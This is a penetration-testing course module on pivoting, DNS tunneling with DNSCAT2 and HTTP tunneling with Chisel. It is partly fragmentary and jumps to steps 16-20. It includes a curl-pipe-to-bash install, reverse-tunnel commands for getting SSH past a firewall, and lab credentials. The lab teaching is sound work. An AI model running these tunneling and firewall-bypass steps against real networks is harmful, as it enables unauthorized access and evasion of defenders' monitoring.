Module 12: Lateral Movement and Pivoting

Scenario

Lateral movement is the process of navigating within a compromised network to gain access to additional systems, accounts, or data. This step is critical in penetration testing as it mimics real-world attacker behavior after initial access is achieved. It helps uncover hidden vulnerabilities, misconfigurations, and weak access controls that could be exploited to expand the attack surface. Testing lateral movement techniques, such as Pass-the-Hash, Pass-the-Ticket, or exploiting poorly segmented networks, provides organizations with valuable insights into their internal defenses and highlights areas where network segregation, privilege restrictions, or monitoring need improvement.

Pivoting allows penetration testers to use a compromised system as a springboard to access other systems that are otherwise inaccessible. It demonstrates how attackers exploit trust relationships, misconfigured firewalls, or weak credentials to infiltrate deeper into the network. Pivoting helps assess the robustness of segmentation and access control mechanisms in environments such as demilitarized zones (DMZs) or isolated internal segments. By simulating pivoting techniques, penetration testers can identify potential chokepoints and recommend measures to limit an attacker’s ability to move laterally, ensuring that a breach in one area does not compromise the entire network.

Students will learn how to perform:

  • HTTP Tunneling Using Chisel

If you exploit a vulnerable system using Metasploit and establish the meterpreter session, you have the option to use this session to pivot to other systems using route command or autoroute module. Once you have the session, then you can add the route to the network that the victim is connected to right within Metasploit. Since we are working with the concept here, we will use the same approach we did with the previous task, and compromise the Ubuntu machine then we can use it to pivot into the other network. We have the credentials, so we will use the same concept here. Remember, this process does not change. With a pivot, you gain access to a machine, and that machine has two or more network cards, then once you have access, you can “pivot” to the other network which you cannot see.

Exercise 2: DNS tunneling Using DNSCAT2

Overview of DNSCAT2

DNSCAT2 is a tool for DNS tunneling, allowing attackers to establish a reverse shell or command-and-control channel via DNS queries and responses. It encodes data into DNS queries sent to an attacker-controlled server, which decodes and returns the data. DNSCAT2 can bypass firewalls, as DNS traffic is typically allowed. In this exercise, we will set up a DNSCAT2 server and client, tunnel commands over DNS, and use Wireshark to monitor DNS traffic for data transfer, learning how attackers exploit DNS tunneling for data exfiltration or remote access while avoiding detection.

In this exercise, DNS tunneling is explored using the DNSCAT2 tool. The objective is to demonstrate how DNS queries can be manipulated to establish communication between a client and an attacker, bypassing traditional network security measures. DNS tunneling allows attackers to transfer data over DNS requests, which can bypass firewalls and other security systems that often allow DNS traffic to pass unfiltered.

The goal of this lab is to use DNSCAT2 to establish a covert communication channel between a compromised client machine and a pentester machine using DNS tunneling. Participants will:

  • Set up DNSCAT2 on both the client and pentester machines

  • Use DNSCAT2 to send and receive data between the two systems

  • Capture DNS traffic using Wireshark to monitor the communication

  • Gain shell access on the client machine via the DNS tunneling connection

  • Understand the underlying concepts and techniques used in DNS tunneling

Exercise: 3 HTTP Tunneling Using Chisel

Overview of Chisel

Chisel is a fast TCP/UDP tunnel that works by creating a direct HTTP/S tunnel between two systems, enabling the transfer of network traffic over HTTP/S ports, which are often open through firewalls. It is used primarily for bypassing restrictive network firewalls and tunneling traffic securely between machines.

HTTP tunneling is a technique used to encapsulate non-HTTP traffic, such as SSH, within HTTP or HTTPS requests to bypass firewalls that block certain ports. In this lab, we will use Chisel, a fast tunneling tool, to establish a reverse SSH tunnel.

The objective of this lab is to demonstrate how HTTP tunneling can bypass restrictive firewalls by encapsulating traffic within HTTP/S. The Ubuntu machine (client) will initiate a connection to the Parrot Security machine (server) over HTTP (port 80), allowing SSH traffic to pass through the tunnel, even though the firewall blocks direct SSH access. This method enables secure communication between machines, bypassing network restrictions.

    This configuration ensures that only HTTP (port 80) and HTTPS (port 443) traffic is allowed through the firewall, blocking other types of traffic like SSH by default.

    curl https://i.jpillora.com/chisel! | bash

  16. On the Parrot Security machine, start the Chisel server in reverse tunneling mode with the following command:

    sudo chisel server -p 80 --reverse

    This command sets up Chisel to listen on port 80 (the standard HTTP port) and enables reverse tunneling, which means the Ubuntu machine will connect to this server to create a tunnel for forwarding SSH traffic.

    more...

  17. On the Ubuntu machine, start the Chisel client, and set up a reverse SSH tunnel by running the following command:

    chisel client 192.168.0.18:80 R:2222:127.0.0.1:22

    This command creates a reverse SSH tunnel, forwarding SSH traffic (port 22) from the Ubuntu machine to port 2222 on the Parrot machine. The R:2222:127.0.0.1:22 option tells Chisel to forward traffic from port 2222 on the Parrot machine to port 22 (SSH) on the local machine (Ubuntu).

    more...

  18. Now both the server Parrot Security and client Ubuntu are connected via HTTP tunneling.

  19. In the Parrot Security machine, open the new terminal.

  20. Now, try to SSH into the Ubuntu machine through the forwarded tunnel from the Parrot Security by running:

    ssh -p 2222 bob@127.0.0.1

    Type Yes and enter Password as Bob@123.

    This command connects to the Ubuntu machine using the SSH service forwarded over the HTTP tunnel. The -p 2222 option specifies the port on the Parrot machine to connect to, while 127.0.0.1 directs the traffic to the local tunnel endpoint.
